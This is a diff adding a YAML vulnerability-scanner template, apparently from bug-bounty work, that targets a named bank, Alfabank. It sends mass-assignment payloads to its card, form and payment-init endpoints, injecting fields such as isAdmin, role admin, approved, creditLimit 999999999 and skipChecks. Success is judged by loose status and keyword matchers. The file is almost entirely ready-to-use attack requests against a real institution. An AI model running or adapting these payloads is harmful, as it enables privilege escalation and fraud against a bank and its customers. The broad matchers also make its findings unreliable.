@@ -1,0 +1,45 @@
+id: alfabank-mass-assignment
+
+info:
+  name: Alfabank - Mass Assignment Vulnerabilities
+  author: bugbounty
+  severity: high
+  description: Mass assignment in payment and form endpoints
+  tags: mass-assignment,alfabank
+
+http:
+  - raw:
+      - |
+        POST /cc-short/step1 HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {"card":"visa_classic","isAdmin":true,"role":"admin","approved":true}
+
+      - |
+        POST /alfaform/ HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        product=dc-short&isApproved=true&creditLimit=999999999
+
+      - |
+        POST /rest/Init HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {"Amount":1000,"OrderId":"test","isVerified":true,"skipChecks":true}
+
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 201
+
+      - type: word
+        part: body
+        words:
+          - "success"
+          - "approved"
+          - "admin"
+        condition: or
